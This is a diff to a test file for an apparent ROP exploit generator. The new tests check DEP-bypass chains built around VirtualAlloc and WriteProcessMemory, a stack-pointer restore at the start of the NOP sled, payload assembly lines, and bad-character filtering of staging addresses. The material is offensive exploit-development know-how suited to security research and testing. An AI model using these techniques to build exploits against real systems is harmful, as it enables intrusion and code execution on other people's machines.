@@ -1,6 +1,6 @@
 import { describe, expect, test } from "vitest";
 import { buildExploit } from "../src/commands/dep_build";
-import { stagedPops, stagingBase } from "../src/commands/dep_frames";
+import { stackSlot, stagedPops, stagingBase } from "../src/commands/dep_frames";
 import { gadgetAddress, jobsFor, met, planJobs, planLines, planWrites, sequence } from "../src/commands/dep_plan";
 import { SCREEN } from "../src/core/screenshot_rule";
 import { buildCapabilityIndexFromRpPlusText } from "../src/rop";
@@ -198,6 +198,51 @@ describe("a frame staged at a fixed address, where the two older styles are refu
     expect(made.holes[0]).toContain("no run of 28 writable bytes");
     expect((made.blocks[6] as { lines: string[] }).lines).toEqual([]);
   });
+
+  // The pivot puts ESP on the frame and the call's ret leaves it there, so whatever the call returns into
+  // runs on what is left of the module's writable section. Measured on T11: VirtualAlloc returned on about
+  // 0x150 bytes of it and the shellcode then spent 0x2210 in one WinExec and faulted in .rdata a page
+  // below the section. The sled's first instruction loads ESP back out of the frame field that already
+  // holds its own stack address, so nothing after the call runs on the section.
+  test("the sled starts by putting ESP back on the stack, out of the frame's own stack field", () => {
+    const made = build(0x11221408);
+    const seventh = (made.blocks[7] as { lines: string[] }).lines.join("\n");
+    // WriteProcessMemory's lpBuffer is field 5, so the stack address sits at STAGING + 0x10.
+    expect(seventh).toContain('restore = bytes.fromhex("8b25") + p32(STAGING + 0x10)');
+    expect(seventh).toContain("mov esp, dword [STAGING + 0x10]");
+    expect(seventh).toContain("payload += PAD * gap + restore + nops + shellcode");
+    // The frame says which field it is, next to the field, so the [6/7] screenshot carries it.
+    expect((made.blocks[6] as { lines: string[] }).lines.join("\n")).toContain("<- and the sled reads ESP back out of here");
+  });
+
+  // Those six bytes travel in the payload, so a bad char in them is the tool's problem, not the user's.
+  // 0x8b rules the short form out and 0x94 the long one, and then there is no instruction left to emit.
+  test("where no encoding of the restore is clean the run says so instead of sending a bad byte", () => {
+    const index = corpus(...NO_COPY);
+    const bad = [...BAD, 0x8b, 0x94];
+    const { plans } = planWrites(index, [], "WriteProcessMemory", facts, bad, "staged");
+    const made = buildExploit({
+      api: "WriteProcessMemory", style: "staged", module: "fixture.dll", badchars: bad, index, plans,
+      exclude: [], iatSlot: IAT_SLOT, writable: facts.writable, cave: facts.cave, staging: 0x11221408, stage: 1,
+    });
+    expect(made.holes.join("\n")).toContain("no clean encoding of STAGING + 0x10 into esp");
+    expect((made.blocks[7] as { lines: string[] }).lines.join("\n")).not.toContain("restore =");
+  });
+
+  // Only the staged style pivots off the stack, so only its sled carries the restore. The other two leave
+  // ESP on the stack and a prologue there would be six bytes of nothing.
+  test("the skeleton style's sled carries no restore, because its frame never left the stack", () => {
+    const index = corpus(...TWO_WRITES);
+    const { plans } = planWrites(index, [], "VirtualAlloc", { iatSlot: IAT_SLOT }, BAD);
+    const made = buildExploit({
+      api: "VirtualAlloc", style: "skeleton", module: "fixture.dll", badchars: BAD, index, plans,
+      exclude: [], iatSlot: IAT_SLOT, stage: 1,
+    });
+    const seventh = (made.blocks[7] as { lines: string[] }).lines.join("\n");
+    expect(seventh).toContain("payload += PAD * gap + nops + shellcode");
+    expect(seventh).toContain("size = len(nops + shellcode)");
+    expect(seventh).not.toContain("restore");
+  });
 });
 
 describe("where a staged frame can be laid", () => {
@@ -229,8 +274,25 @@ describe("where a staged frame can be laid", () => {
   });
 
   test("the pivot's own pops are popped off the base as well", () => {
-    expect(stagedPops("WriteProcessMemory", 4, 1)).toEqual([-4, 0, 4, 8, 0xc, 0x10, 0x14, -4]);
-    expect(stagedPops("VirtualProtect", 0, 0)).toEqual([0, 4, 8, 0xc, 0x10, 0x14, 0]);
+    expect(stagedPops("WriteProcessMemory", 4, 1)).toEqual([-4, 0, 4, 8, 0xc, 0x10, 0x14, -4, 0x10]);
+    expect(stagedPops("VirtualProtect", 0, 0)).toEqual([0, 4, 8, 0xc, 0x10, 0x14, 0, 4]);
+  });
+
+  // The last offset is the one dword of the frame the chain does not pop: the field holding the sled's
+  // stack address, which the sled loads ESP from, so its four bytes travel in the payload instead. A base
+  // whose popped addresses are all clean and whose stack field is not would emit a sled nobody can send.
+  // It bites only where the write gadget's displacement is large enough to lift every popped address off
+  // that field, which is T11's `mov [ecx+0x20], eax`.
+  test("the field the sled reads ESP back out of has to be clean too", () => {
+    expect(stackSlot("VirtualAlloc")).toBe(1);
+    expect(stackSlot("VirtualProtect")).toBe(1);
+    expect(stackSlot("WriteProcessMemory")).toBe(4);
+    const run = { at: 0x112209dc, size: 0x60 };
+    const popped = stagedPops("VirtualAlloc", 0x20, 0).slice(0, -1);
+    // Every dword this chain pops off 0x112209fc is clean, so the popped set alone takes that base.
+    expect(stagingBase(run, 0x18, popped, BAD)).toBe(0x112209fc);
+    // Its stack field is 0x11220a00, which carries two bad chars, so the frame drops one dword.
+    expect(stagingBase(run, 0x18, stagedPops("VirtualAlloc", 0x20, 0), BAD)).toBe(0x112209f8);
   });
 });
 
